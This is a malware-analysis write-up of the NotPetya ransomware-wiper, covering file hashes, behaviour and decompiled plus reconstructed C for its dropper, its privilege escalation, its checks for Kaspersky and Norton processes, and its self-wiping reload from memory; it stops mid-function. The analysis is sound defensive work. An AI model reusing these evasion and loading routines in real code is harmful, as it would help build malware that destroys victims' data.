# 170680a09289ac6969171ff4173cd7a17106b8a5a3443ca4c987cb32bdc39808.exe

## Static Analisys
- **Target**: Microsoft Windows
- **Family**: Ransomware, Wiper
- **Malware name**: NotPetya (Eternal Petya)

- **Files**:
    - `170680a09289ac6969171ff4173cd7a17106b8a5a3443ca4c987cb32bdc39808.exe`: NotPetya's dll dropper and loader.
    - `perfc.dat`: NotPetya's main dll payload.
    - `dllhost.dat`: Dropped resource from `perfc.dat`, it's just [psexec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec).

    - `res1.exe`: Dropped resource from `perfc.dat`, it's a credential stealer (x64).
    - `res2.exe`: Dropped resource from `perfc.dat`, it's a credential stealer (x86).
    - `PayloadMBR.bin`: This is the dumped malicious MBR payload (plus other sectors), which are responsible for encrypting the MFT.

- **Notes**: while theoretically the encrypted files can be recovered using the `RSA private key` of the attacker to retrieve the `AES key` that encrypted our files, there is NO WAY we can recover the encrypted drive from the MBR payload, as there the `Personal Installation Key` **is a randombly generated string that has nothing to do with the Salsa20 key**.

### 170680a09289ac6969171ff4173cd7a17106b8a5a3443ca4c987cb32bdc39808.exe
- **SHA256**: 170680a09289ac6969171ff4173cd7a17106b8a5a3443ca4c987cb32bdc39808
- **MD5**: ee33c75ed9799db8d45078a01de53447
- **Architecture**: x86, i386

- **Language**: C, C++
- **Compilers**: Microsoft Visual C/C++ (16.00.30319)
- **Linkers**: Microsoft Linker (10.00.30319)

- **Entropy**: 7.85797 (Packed)
- **Dll Imports**:
    - `KERNEL32.dll`
    - `USER32.dll`

### perfc.dat
- **SHA256**: 027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745
- **MD5**: 71b6a493388e7d0b40c83ce903bc6b04
- **Architecture**: x86, i386

- **Language**: C, C++
- **Compilers**: Microsoft Visual C/C++ (18.00.40629)
- **Linkers**: Microsoft Linker (10.00.40219)

- **Entropy**: 7.80194 (Packed)
- **Dll Imports**:
    - `KERNEL32.dll`
    - `USER32.dll`
    - `ADVAPI32.dll`
    - `SHELL32.dll`
    - `ole32.dll`
    - `CRYPT32.dll`
    - `SHLWAPI.dll`
    - `IPHLPAPI.DLL`
    - `WS2_32.dll`
    - `MPR.dll`
    - `NETAPI32.dll`
    - `DHCPSAPI.DLL`
    - `msvcrt.dll`

### dllhost.dat
- **SHA256**: f8dbabdfa03068130c277ce49c60e35c029ff29d9e3c74c362521f3fb02670d5
- **MD5**: aeee996fd3484f28e5cd85fe26b6bdcd
- **Architecture**: x86, i386

- **Language**: C, C++
- **Compilers**: Microsoft Visual C/C++ (2008-2010), Microsoft Visual C/C++ (15.00.30729)
- **Linkers**: Microsoft Linker (9.00.30729)

- **Entropy**: 6.56614 (Packed)
- **Dll Imports**:
    - `VERSION.dll`
    - `NETAPI32.dll`
    - `WS2_32.dll`
    - `MPR.dll`
    - `KERNEL32.dll`
    - `USER32.dll`
    - `GDI32.dll`
    - `COMDLG32.dll`
    - `ADVAPI32.dll`

### res1.exe
- **SHA256**: 02ef73bd2458627ed7b397ec26ee2de2e92c71a0e7588f78734761d8edbdcd9f
- **MD5**: 7e37ab34ecdcc3e77e24522ddfd4852d
- **Architecture**: x64, AMD64

- **Language**: C, C++
- **Compilers**: Microsoft Visual C/C++ (16.00.40219)
- **Linkers**: Microsoft Linker (10.00.40219)

- **Entropy**: 5.68077 (Not packed)
- **Dll Imports**:
    - `KERNEL32.dll`
    - `USER32.dll`
    - `ntdll.dll`
    - `SHLWAPI.dll`
    - `ADVAPI32.dll`

### res2.exe
- **SHA256**: 02ef73bd2458627ed7b397ec26ee2de2e92c71a0e7588f78734761d8edbdcd9f
- **MD5**: 7e37ab34ecdcc3e77e24522ddfd4852d
- **Architecture**: x86, i386

- **Language**: C, C++
- **Compilers**: Microsoft Visual C/C++ (2008-2010), Microsoft Visual C/C++ (16.00.40219)
- **Linkers**: Microsoft Linker (10.00.40219)

- **Entropy**: 6.07100 (Not packed)
- **Dll Imports**:
    - `KERNEL32.dll`
    - `USER32.dll`
    - `ntdll.dll`
    - `SHLWAPI.dll`
    - `ADVAPI32.dll`

## Behavior Analisys
### 170680a09289ac6969171ff4173cd7a17106b8a5a3443ca4c987cb32bdc39808.exe
This is nothing more than the dropper, which quickly drops into the Windows folder the main malware dll (perfc.dat), and executes it with `C:\Windows\System32\rundll32.exe C:\Windows\perfc.dat,#1`.

### perfc.dat
This is the main dll payload, which is responsible for the main malware behavior.
After being executed, it adjust the process privileges, trying to add the following ones:
- `SeShutdownPrivilege`
- `SeDebugPrivilege`
- `SeTcbPrivilege`

After that, the malware checks for known AV programs, in particular for Kaspersky, Norton and Symantec.
It also tries to relaunch itself from memory. The malware then checks if the file `C:\Windows\perfc` exists, and in that case it immediately quits the execution, else, it creates it.

Now the malware wipes the second sector of the drive, and write the custom MBR. If the writing fails, or Kaspersky antivirus is detected on the system, it wiped the first 10 sectors of the disk, effectively making the drive unbootable.

Now the malware schedules the system shutdown, then it enumerates all the network devices, and drops a credential stealer into the system, probably to retrieve credentials to access other devices. Drops `dllhost.dat`, better known as `psexec.exe`, a legitimate tool which can execute commands on remote systems. It uses it to execute itself on other systems.

Then, it steals all the processes' tokens, in order to escalate privileges, and execute the malware on other systems using `wmic.exe` and `psexec.exe`.
It also uses the [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) exploit to further spread into the non patched systems.

It now loops through all the physical drives of the system to encrypt all the files with the following extensions: `.3ds .7z .accdb .ai .asp .aspx .avhd .back .bak .c .cfg .conf .cpp .cs .ctl .dbf .disk .djvu .doc .docx .dwg .eml .fdb .gz .h .hdd .kdbx .mail .mdb .msg .nrg .ora .ost .ova .ovf .pdf .php .pmf .ppt .pptx .pst .pvi .py .pyc .rar .rtf .sln .sql .tar .vbox .vbs .vcb .vdi .vfd .vmc .vmdk .vmsd .vmx .vsdx .vsv .work .xls .xlsx .xvd .zip`, but skips the files inside the `C:\Windows` folder.

This is the ransom note it leaves in each encrypted folder:

![README note](https://gitlab.naitshiro.it/chry/reverse-engineering/-/raw/main/NotPetya/Images/READMEransom.png)

After that, it clears the event logger, and tries to shutdown the system immediately.

### dllhost.dat
There's no need to reverse engineer this tool, you can just look at the [MSDN](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) website to see what it does, but just to quote what MSDN says:

*Utilities like Telnet and remote control programs like Symantec's PC Anywhere let you execute programs on remote systems, but they can be a pain to set up and require that you install client software on the remote systems that you wish to access. PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. PsExec's most powerful uses include launching interactive command-prompts on remote systems and remote-enabling tools like IpConfig that otherwise do not have the ability to show information about remote systems.*

*Note: some anti-virus scanners report that one or more of the tools are infected with a "remote admin" virus. None of the PsTools contain viruses, but they have been used by viruses, which is why they trigger virus notifications.*

### res1.exe
This is the credential stealer used by NotPetya to gather access to other systems on the network.

### res2.exe
It's the same thing as `res1.exe` but in the x86 architecture.

### PayloadMBR.bin
This is the NotPetya's MBR payload, which is used to encrypt the MFT and display the ransom note.

After the first execution, it copies itself into memory. Then it proceeds by reading sector `32` into memory. This sectors contains a byte which is used to check if the disk has already been encrypted or not, the Salsa20 `key` and `nonce`. Now the malware loads into memory sectors `33` and the ones starting from `0x8000`. Sectors `33` is a sector full of `0x7`. This sector is used to verify if the key is valid during the decryption process.

Now the malware encrypts all the sectors loaded into memory, writes them back into the drive, and in the meantime the `fake CHKSDK screen` is displayed:

![Fake CHKDSK](https://gitlab.naitshiro.it/chry/reverse-engineering/-/raw/main/NotPetya/Images/FakeCHKDSK.png)

Then it wipes away the Salsa20 key from the drive, and reboots the computer.

Now the ransom note is displayed, demanding for a payment into a bitcoin address. When the user has the correct key, the malware starts by decrypting sector `33` and checking if the bytes inside it are all `0x7`. If they are the key is valid, the disk gets decrypted, the original MBR xored with `0x7` is xored back and restored.

This is the ransom note displayed in the screen:

![Ransom note](https://gitlab.naitshiro.it/chry/reverse-engineering/-/raw/main/NotPetya/Images/RansomNote.png)

## Advanced Behavior Analisys
***All the interpreted code refers to either the ghidra, cutter or IDA projects. Sometimes the debugger was used to help gathering functions parameters...***

My code comments notation when looking into C code:

```c
// Standard comment: explaining the code you see below
/* Truncate code part explaination: sometimes there may be some useless code, which i replace with this comment, explaining what the code does */
```

My code comments notation when looking into Assembly code:

```asm
; Standard comment: explaining the code you see in the left or below
```

### 170680a09289ac6969171ff4173cd7a17106b8a5a3443ca4c987cb32bdc39808.exe
This program is the main dll dropper and loader. The main function is the entry one, which Ghidra decompiles into this:

```c
void entry(void){
    short *psVar1;
    LPCWSTR lpApplicationName;
    undefined4 *puVar2;
    undefined4 *puVar3;
    HANDLE hFile;
    int iVar4;
    int iVar5;
    uint uVar6;
    uint uVar7;
    LPWSTR *ppWVar8;
    LPWSTR *ppWVar9;
    _STARTUPINFOW systemInfo;
    _PROCESS_INFORMATION processInfo;
    DWORD bytesWritten;
    LPCWSTR rundllPath;
    LPCWSTR perfcPath;
    WCHAR lpCmdLine [529];
    undefined4 lpWinDir;
    undefined2 local_404 [249];
    LPWSTR lpSystem32;
    uint local_8;
    
    local_8 = DAT_00403000 ^ (uint)&stack0xfffffffc;
    GetSystemDirectoryW((LPWSTR)((int)&lpSystem32 + 2),0x208);
    GetWindowsDirectoryW((LPWSTR)((int)&lpWinDir + 2),0x208);
    rundllPath = (LPCWSTR)((int)&lpSystem32 + 2);
    ppWVar9 = &lpSystem32;

    do {
        psVar1 = (short *)((int)ppWVar9 + 2);
        ppWVar9 = (LPWSTR *)((int)ppWVar9 + 2);
    } while(*psVar1 != 0);

    perfcPath = (LPCWSTR)((int)&lpWinDir + 2);
    ppWVar8 = (LPWSTR *)0x402030;

    for(iVar5 = 7; puVar2 = &lpWinDir, iVar5 != 0; iVar5 = iVar5 + -1){
        *ppWVar9 = *ppWVar8;
        ppWVar8 = ppWVar8 + 1;
        ppWVar9 = ppWVar9 + 1;
    }

    do {
        puVar3 = puVar2;
        puVar2 = (undefined4 *)((int)puVar3 + 2);
    } while(*(short *)((int)puVar3 + 2) != 0);
    *(undefined4 *)((int)puVar3 + 2) = 0x70005c;
    *(undefined4 *)((int)puVar3 + 6) = 0x720065;
    *(undefined4 *)((int)puVar3 + 10) = 0x630066;
    *(undefined4 *)((int)puVar3 + 0xe) = 0x64002e;
    *(undefined4 *)((int)puVar3 + 0x12) = 0x740061;
    *(undefined2 *)((int)puVar3 + 0x16) = 0;
    hFile = CreateFileW(perfcPath,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0,(HANDLE)0x0);
    uVar6 = 0;
    do {
        uVar7 = uVar6 + 1;
        (&lpPerfcBuff)[uVar6] = (&lpPerfcBuff)[uVar6] ^ (byte)(0x6b81 % (longlong)(int)(uVar6 + 1));
        uVar6 = uVar7;
    } while(uVar7 < 0x58778);

    WriteFile(hFile,&lpPerfcBuff,0x58778,&bytesWritten,(LPOVERLAPPED)0x0);
    CloseHandle(hFile);
    lpApplicationName = rundllPath;
    iVar5 = 0x58778;

    do {
        iVar4 = iVar5 + -1;
        *(undefined *)(iVar5 + 0x403fff) = 0;
        iVar5 = iVar4;
    } while(0 < iVar4);

    wsprintfW(lpCmdLine,L"%ws %ws,#1",rundllPath,perfcPath);
    iVar5 = 0x44;

    do {
        iVar4 = iVar5 + -1;
        (&stack0xfffff763)[iVar5] = 0;
        iVar5 = iVar4;
    } while(0 < iVar4);

    systemInfo.cb = 0x44;
    CreateProcessW(lpApplicationName,lpCmdLine,(LPSECURITY_A TTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0,0x8000000,(LPVOID)0x0,(LPCWSTR)0x0,&systemInfo,&processInfo);

    ExitProcess(0);
}
```

After some dynamic analisys with x32dbg and some cleaning, the decompilation should look like something like that:

```c
void entry(){
    LPCWSTR lpApplicationName;
    HANDLE hFile;
    STARTUPINFOW systemInfo;

    PROCESS_INFORMATION processInfo;
    DWORD bytesWritten;
    LPCWSTR rundllPath, perfcPath;

    WCHAR lpCmdLine[529];
    LPWSTR lpWinDir, lpSystem32;
    
    GetSystemDirectoryW(lpSystem32,0x208);
    GetWindowsDirectoryW(lpWinDir,0x208);
    
    /* Appending the lpWinDir path to the perfcPath */
    /* Appending the lpSystem32 path to the rundllPath */

    hFile = CreateFileW(perfcPath,GENERIC_WRITE,0,NULL,2,0,NULL);

    /* Some lpPerfcBuff xoring */

    WriteFile(hFile,&lpPerfcBuff,0x58778,&bytesWritten,NULL);
    CloseHandle(hFile);

    lpApplicationName = rundllPath;

    wsprintfW(lpCmdLine,L"%ws %ws,#1",rundllPath,perfcPath);

    systemInfo.cb = 0x44;

    CreateProcessW(lpApplicationName,lpCmdLine,NULL,NULL,0,CREATE_NO_WINDOW,NULL,NULL,&systemInfo,&processInfo);
    ExitProcess(0);
}
```

We can get a rough idea of what is going on right now. The dropper locates the path of system32 to be able to use the `rundll32.exe` program. After that, it locates the Windows folder, to be able to drop the malware dll. After that, the dll gets written, and executed.

### perfc.dat
#### Ordinal_1
This is the main dll module, the one that gets launched by the malware. 

#### setPrivilegesCheckAVAndLoadIntoMemory
##### FUN_10007cc0
Let's jump into the first functions that pops right in front of us. Ghidra decompiles it as the following:

```c
void FUN_10007cc0(void)
{
    BOOL BVar1;
    DWORD DVar2;
    uint uVar3;
    
    if(DAT_1001f114 == 0){
        DAT_1001f118 = GetTickCount();
        BVar1 = FUN_100081ba(L"SeShutdownPrivilege");
        uVar3 = (uint)(BVar1 != 0);
        BVar1 = FUN_100081ba(L"SeDebugPrivilege");
        if(BVar1 != 0){
            uVar3 = uVar3 | 2;
        }
        BVar1 = FUN_100081ba(L"SeTcbPrivilege");
        if(BVar1 != 0) {
            uVar3 = uVar3 | 4;
        }
        DAT_1001f144 = uVar3;
        DAT_1001f104 = FUN_10008677();
        DVar2 = GetModuleFileNameW(hModule_1001f120,&pszPath_1001f148,0x30c);
        if (DVar2 != 0) {
            FUN_10008acf();
            return;
        }
    }
    return;
}
```

As we can see, there are some Se...Privilege passed inside the `FUN_100081ba` function.
The function also calls the `FUN_10008677` and `FUN_10008acf` functions.

The function `FUN_10007cc0` it's nothing special, it's just the parent function, which launches all the child ones.

##### FUN_100081ba
However, things get interesting when we look at the `FUN_100081ba` function:

```c
BOOL FUN_100081ba(LPCWSTR param_1)
{
    HANDLE ProcessHandle;
    BOOL BVar1;
    BOOL BVar2;
    DWORD DesiredAccess;
    HANDLE *TokenHandle;
    _TOKEN_PRIVILEGES local_1c;
    DWORD local_c;
    HANDLE local_8;
    
    local_1c.PrivilegeCount = 0;
    local_1c.Privileges[0].Luid.LowPart = 0;
    local_1c.Privileges[0].Luid.HighPart = 0;
    local_1c.Privileges[0].Attributes = 0;
    TokenHandle = &local_8;
    DesiredAccess = 0x28;
    BVar2 = 0;
    local_c = 0;
    local_8 = (HANDLE)0x0;
    ProcessHandle = GetCurrentProcess();
    BVar1 = OpenProcessToken(ProcessHandle,DesiredAccess,TokenHandle);
    if(BVar1 != 0){
        BVar1 = LookupPrivilegeValueW((LPCWSTR)0x0,param_1,&local_1c.Privileges[0].Luid);
        if(BVar1 != 0){
            local_1c.PrivilegeCount = 1;
            local_1c.Privileges[0].Attributes = 2;
            BVar2 = AdjustTokenPrivileges(local_8,0,&local_1c,0,(PTOKEN_PRIVILEGES)0x0,(PDWORD)0x0);
            local_c = GetLastError();
            if(local_c != 0){
                BVar2 = 0;
            }
        }
    }
    SetLastError(local_c);
    return BVar2;
}
```

We can instantly understand what the code does, it simply gets the LUID code of the privilege, and tries to apply it to the process. If it succeeds, the return value is true, else its false. Cleaning up the decompilation should give a code like this one:

```c
BOOL adjustTokenPrivilege(LPCWSTR privilegeName){
    HANDLE hProcess, hProcessToken;
    BOOL success, ret = false;
    TOKEN_PRIVILEGES lpLuid;

    DWORD lastError = 0;
    
    lpLuid.PrivilegeCount = 0;
    lpLuid.Privileges[0].Luid.LowPart = 0;
    lpLuid.Privileges[0].Luid.HighPart = 0;

    lpLuid.Privileges[0].Attributes = 0;

    // Retrieve the current process handle
    hProcess = GetCurrentProcess();

    // Try to acquire the process token
    success = OpenProcessToken(hProcess,(TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY),&hProcessToken);

    if(success){
        // Lookup the privilege LUID
        success = LookupPrivilegeValueW(NULL,privilegeName,&lpLuid.Privileges[0].Luid);

        if(success){
            lpLuid.PrivilegeCount = 1;
            lpLuid.Privileges[0].Attributes = 2;

            // Try to adjust the token privilege
            ret = AdjustTokenPrivileges(hHandle,0,&lpLuid,0,NULL,NULL);
            lastError = GetLastError();

            // If error occours, set ret to 0
            if(lastError != 0) ret = false;
        }
    }

    SetLastError(lastError);
    return ret;
}
```

##### FUN_10008677
Now it's time to dive into the `FUN_10008677` function. It loops through all the processes, and starting by their name, it computates a hash.
If the malware finds specific hashes, it sets some bitmask into a variable. It turned out that those hashes corresponded to known AV softwares.

A cleaned up decompilation should look something like that:

```c
uint checkForAV(){
    HANDLE hObject;
    int finish, finalHash
    WCHAR *fileName;

    PROCESSENTRY32W lppe;
    uint hashMask = 0xffffffff;
    
    // Get a snapshot of the processes
    hObject = CreateToolhelp32Snapshot(2,0);

    if(hObject != NULL){
        finish = Process32FirstW(hObject,&lppe);

        // Then loop though all of them
        while(!finish){
            fileName = lppe.szExeFile;
            finalHash = 0x12345678;
      
            /* Hashing logic... */
      
            // Check if the program's hash matches the avp.exe program (Kaspersky)
            if(finalHash == 0x2e214b44) hashMask &= 0xfffffff7;

            // Check if the program's hash matches the NS.exe or ccSvcHst.exe programs (Norton or Symantec)
            if((finalHash == 0x6403527e) || (finalHash == 0x651b3005)) hashMask &= 0xfffffffb;

            finish = Process32NextW(hObject,&lppe);
        }

        CloseHandle(hObject);
    }

    return hashMask;
}
```

##### FUN_10008acf
After that, we can look into the `FUN_10008acf` function. Here we can see it creates a handle to itself, allocates into heap its size, and then tries to write into the allocated buffer a copy of itself. At that point, if the copy was successfull, true is returned and the payload buffer and size gets copied into a global variable (check ghidra's decompilation for further details), else the heap is freed.

```c
bool loadPayloadIntoMemory(){
    HANDLE hFile, hHeap;
    DWORD fileSize, dwFlags, dwBytes, lpNumberOfBytesRead;
    LPVOID lpBuffer;

    BOOL readSuccess, success = false;

    // Opens the current file
    hFile = CreateFileW(&lpPath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);

    if(hFile != NULL){
        fileSize = GetFileSize(hFile,NULL);
        if(fileSize != 0){
            dwFlags = 0;
            dwBytes = fileSize;

            // Allocate the file size into the process heap
            hHeap = GetProcessHeap();
            lpBuffer = HeapAlloc(hHeap,dwFlags,dwBytes);

            if(lpBuffer != NULL){
                lpNumberOfBytesRead = 0;

                // Read all the file into the allocated buffer
                readSuccess = ReadFile(hFile,lpBuffer,fileSize,&lpNumberOfBytesRead,NULL);

                // If the file could not be successfully read, free the allocated memory
                if((!readSuccess) && (lpNumberOfBytesRead == fileSize)){
                    fileSize = 0;
                    hHeap = GetProcessHeap();
                    HeapFree(hHeap,fileSize,lpBuffer);
                }
                else {
                    success = true;
                    globalMalwareBuffer = lpBuffer;
                    globalFileSize = fileSize;
                }
            }
        }
        CloseHandle(hFile);
    }
    return success;
}
```
##### Back to FUN_10007cc0
Now, we can finally get a good overview of what the father function does. 

```c
void setPrivilegesCheckAVAndLoadIntoMemory(){
    BOOL success;
    DWORD gotFilePath;
    uint privilegesMask;
    
    // Check this strange flag
    if(globalSmt == 0){
        // Save the current ticks into a global variable
        globalTicks = GetTickCount();

        // Proceeds to set a bitmask containing all the set privileges
        success = adjustTokenPrivilege(L"SeShutdownPrivilege");
        privilegesMask = (success != 0);

        success = adjustTokenPrivilege(L"SeDebugPrivilege");
        if(success) privilegesMask = privilegesMask | 2;

        success = adjustTokenPrivilege(L"SeTcbPrivilege");
        if(success) privilegesMask = privilegesMask | 4;

        // Save the bitmask into a global variable
        globalPrivilegesMask = privilegesMask;

        // Check for known antiviruses, and save the AV mask into a global variable
        globalAVFlags = checkForAV();

        // Acquire the full malware dll path, and if  it succeeds, load the payload into heap
        gotFilePath = GetModuleFileNameW(hCurrentModule,&lpFullDllPath,0x30c);

        if(gotFilePath) loadPayloadIntoMemory();
    }

    return;
}
```

Keep in mind the `globalSmt` global variable, it'll come back later. Right now let's assume it's default value is 0.

#### launchMalwareFromMemory
##### FUN_10009590
Going back into the main function (`Ordinal_1`), we can see that immediately after the `setPrivilegesCheckAVAndLoadIntoMemory` function it checks if the handle passed as 4th parameter is invalid. If the handle is indeed not valid, it goes into a function that ghidra decompiles like that:

```c
undefined4 FUN_10009590(undefined4 param_1,undefined4 param_2,undefined4 param_3){
    undefined *lpMemory;
    int iVar1;
    BOOL success;
    cls_0x10009322 *this;
    DWORD flOldProtect;
    SIZE_T dwSize2;
    SIZE_T dwSize;
    SIZE_T dwSize3;
    HMODULE hCurrentModule;
    undefined *lpMemoryCopy;
    int malwareBuffer;
    
    hCurrentModule = ::hCurrentModule;
    if((globalSmt == 0) && (globalMalwareBuffer != 0)){
        dwSize = *(SIZE_T *)((int)&::hCurrentModule[0x14].unused + ::hCurrentModule[0xf].unused);
        dwSize2 = dwSize;
        lpMemory = (undefined *)VirtualAlloc((LPVOID)0x0,dwSize,0x1000,4);
        if(lpMemory != (undefined *)0x0) {
            globalLpMemory = lpMemory;
            memcpy(lpMemory,hCurrentModule,dwSize);
            malwareBuffer = globalMalwareBuffer;

            this = (cls_0x10009322 *)(*(int *)(globalMalwareBuffer + 0x3c) + globalMalwareBuffer);

            if(((this != (cls_0x10009322 *)0x0) && (*(uint *)&this[7].mbr_0x6 != 0)) && (*(int *)&this[7].field_0xa != 0)){
                iVar1 = cls_0x10009322::meth_0x10009322(this,*(uint *)&this[7].mbr_0x6);

                if((((cls_0x100091fa *)(iVar1 + malwareBuffer) != (cls_0x100091fa *)0x0) &&
                    (malwareBuffer = cls_0x100091fa::meth_0x100091fa((cls_0x100091fa *)(iVar1 + malwareBuffer),(int)lpMemory),malwareBuffer != 0)) && (malwareBuffer = FUN_10009286(lpMemory), malwareBuffer != 0)){
                    
                    (*(code *)(lpMemory + ((int)FUN_100094a5 - (int)::hCurrentModule)))(param_1,param_2,param_3,0xffffffff);
                }
            }

            dwSize3 = dwSize2;
            success = VirtualProtect(lpMemory,dwSize2,4,&flOldProtect);
            lpMemoryCopy = lpMemory;

            dwSize = dwSize3;

            if(success != 0){
                for(; dwSize != 0; dwSize = dwSize - 1){
                    *lpMemoryCopy = 0;
                    lpMemoryCopy = lpMemoryCopy + 1;
                }

                VirtualFree(lpMemory,dwSize3,0x4000);
            }
        }
    }
    return 0;
}
```

If you don't understand what the function does, you're not alone... it's a big mess. All the meth functions contains some gibberish code.
Let's try to have a really rough idea of what the function does looking into the `FUN_100094a5` function.

##### FUN_100094a5
Now we can see that the first thing the function does is unloading the current dll module, and assigning the return value to `globalSmt`, our flag.
Now, if the dll module can't unload itself, the payload's memory copy get's assigned to the `hCurrentModule`. Then the dll file is opened with read permissions, after which it gets the file size. Then, the same file is opened with write permissions, a heap with all zeroes is allocated, and then the file gets overwritten.

After that, the file gets deleted, and a call to the `FUN_10009367` function is made. This function is also a mess, but we can make sense of it a bit. Notice that there are some `VirtualProtect`, `LoadLibraryA` and `GetProcAddress` that all refers to the malware dll? I think that the malware literally loads all the module needed for execution, and then changes its memory region protection (maybe to become executable). Indeed, if the function returns true, a call to the `Ordinal_1` function is made.

Now we have a clear overview of what this code does:

```c
void wipeDllAndLoadFromMemory(uint uInt,HANDLE hHandle1,LPCWSTR strStr,HANDLE hHandle2){
    HANDLE hFile, hHeap;
    LPVOID lpBuffer;
    BOOL success;

    DWORD dwFlags, bytesToWrite, dwBytes;
    
    // Try to unload the dll module
    globalSmt = FreeLibrary(hCurrentModule);

    // If it cannot unload the module
    if(!globalSmt){
        hCurrentModule = globalLpMemory;
        hFile = CreateFileW(&lpFullDllPath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);

        if(hFile != NULL){
            bytesToWrite = GetFileSize(hFile,NULL);

            CloseHandle(hFile);
            hFile = CreateFileW(&lpFullDllPath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);

            if(hFile != NULL){
                lpBuffer = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,bytesToWrite);

                if(lpBuffer != NULL){
                    WriteFile(hFile,lpBuffer,bytesToWrite,&bytesToWrite,NULL);
                    HeapFree(GetProcessHeap(),0,lpBuffer);
                }

                CloseHandle(hFile);
            }
        }

        // Wipe the perfc.dat from the disk
        globalWipedSuccess = DeleteFileW(&lpFullDllPath);
        success = loadLibrariesAndBecomeExecutable();

        // Realunch from memory (WITH globalSmt SET TO 1)
        if(success) Ordinal_1(uInt,hHandle1,strStr,hHandle2);
        
        ExitProcess(0);
    }

    return;
}
```

##### Back to FUN_10009590
Note also in the `FUN_10009590` function, the call to the `Ordinal_1` function is made with all the same parameters, but the last one, which is the invalid handle value.
We can oversimplify the code (a lot) to look like that:

```c
int launchMalwareFromMemory(uint uInt,HANDLE hHandle1,LPCWSTR strStr){
    // Note the flag globalSmt. After the malware gets re-executed this function will no longer be called
    if((globalSmt == 0) && (globalMalwareBuffer != 0)){

        /* Some other functions, not much usefull nor relevant... */

        // Pass the new values to the wipeDllAndLoadFromMemory, which then passes them to the new Ordinal_1 function
        (*wipeDllAndLoadFromMemory)(uInt,hHandle1,strStr,0xffffffff);
    }

    return 0;
}
```

#### Initialize Winsock DLL
##### Ordinal_115
Next up we encounter the call of a function called `Ordinal_115`. However ghidra doesn't decompile it, but shows us that this is a function from the `WS2_32.DLL dll`.
We can add an external reference using this library, and now we can see that this is the `WSAStartup` function, which is used to initialises the Winsock.

#### acquireCriticalSection
##### FUN_10007091
Immediately after `WSAStartup` is called, we encounter the `FUN_10007091` function. We can recognize some Critical Section related functions, and we can see that if the `PRTL_CRITICAL_SECTION_DEBUG` structure failed to allocate, it goes into `FUN_10007003`. Personally for me, this function is gibberish, but we can somehow see that it continuously get the process heap, and then frees it. We can assume that it tries to free as much heap as possible.

Anyways, back to `FUN_10007091`. After a bit of cleaning, we can get an idea of what it does:

```c
LPCRITICAL_SECTION acquireCriticalSection(LONG lockCount,ULONG_PTR spinCount,PRTL_CRITICAL_SECTION_DEBUG debugInfo,int recursionCount){
    HANDLE hHeap;
    LPCRITICAL_SECTION lpCriticalSection;
    PRTL_CRITICAL_SECTION_DEBUG lpCriticalSectionDebug;
    
    hHeap = GetProcessHeap();

    // Allocate heap for the Critical Section
    lpCriticalSection = (LPCRITICAL_SECTION)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x34);
    if(lpCriticalSection != NULL){
        // Initialize it
        InitializeCriticalSection(lpCriticalSection);

        lpCriticalSection[1].RecursionCount = recursionCount;
        lpCriticalSection[1].LockCount = lockCount;
        lpCriticalSection[1].SpinCount = spinCount;
        
        lpCriticalSection[1].OwningThread = (HANDLE)0x0;
        lpCriticalSection[2].DebugInfo = debugInfo;

        hHeap = GetProcessHeap();

        // Allocate heap for the Critical Section Debug
        lpCriticalSectionDebug = (PRTL_CRITICAL_SECTION_DEBUG)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,recursionCount << 2);
        lpCriticalSection[1].DebugInfo = lpCriticalSectionDebug;

        // If the heap couldn't be allocated, free as much heap as possible
        if(lpCriticalSectionDebug == NULL){
            freeAsMuchHeapAsPossible();
            lpCriticalSection = NULL;
        }
    }

    return lpCriticalSection;
}
```

##### FUN_10006caa
We can also see that the second time `acquireCriticalSection` function gets called, this function is passed as a parameter.
This function is relatively small, and it just frees the heap if the passed memory address has not been allocated. Ghidra decompiles it as following:

```c
void freeMoreHeap(LPVOID *param_1){
    HANDLE pvVar1;
    DWORD DVar2;
    LPVOID pvVar3;
    
    if(param_1 != NULL){
        pvVar3 = *param_1;
        if(pvVar3 != NULL){
            DVar2 = 0;
            pvVar1 = GetProcessHeap();
            HeapFree(pvVar1,DVar2,pvVar3);
        }

        pvVar3 = param_1[1];

        if(pvVar3 != NULL){
            DVar2 = 0;
            pvVar1 = GetProcessHeap();
            HeapFree(pvVar1,DVar2,pvVar3);
        }
    }
    return;
}
```

After that function, another critical section gets initialised.

#### parseCmdLineToDelayExecution
##### FUN_10006a2b
Then, another function is called, `FUN_10006a2b`, with a parameter from the `Ordinal_1` function. Let's dive into it.
One of the first things we see is the fact that it checks if the parameter passed in the function is null. If it's not, it copies it into a local variable, and then calculates the string length. If the length is greater than 0, it calls the `CommandLineToArgvW`, to break the string into an array of smaller strings.

Indeed, we can assume that this string in indeed a command line. Then, it makes the first parameter an integer. If it's greater than 0, it stores it in a global variable. Keep this global variable in mind for later.

Then it goes again in a loop and checks if a parameter is `'-h'`. In that case, `FUN_100069a2` gets called. We'll analize it later. Then, it checks if the parameter contains `':'`, in that case it truncates the string right there, and calls `FUN_10006de0`. The cycle repeats for all the parameters.

In the end, if the global variable we talked above is 0, it becomes 60.

##### FUN_100069a2
The code in the `FUN_100069a2` is really similar to the previous function's one. It replaces the `';'` characters in the command line parameter with spaces. After that, it further separate the parameters with the `CommandLineToArgvW` function. Then it checks the length of the single parameters, and if they are less than 16 characters, is goes into the `FUN_10006fc7` function, which uses as parameter the first global critical section initialised earlier. 

##### FUN_10006fc7
This function is fairly small. It simply returns 0 if the last command line points to a null character, or it returns the value of the `FUN_10007298` function.
After a bit of cleaning up, and naming variables, ghidra's decompilation looks like the following:

```c
uint FUN_10006fc7(LPCRITICAL_SECTION lpCriticalSection){
    short *ptrCmdArr;
    uint ret;
    int lenDiff;

    undefined4 _4bytesVar;
    short shortBuff [16];
    short prtCmdArrChar;

    if((ptrCmdArr == (short *)0x0) || (*ptrCmdArr == 0)){
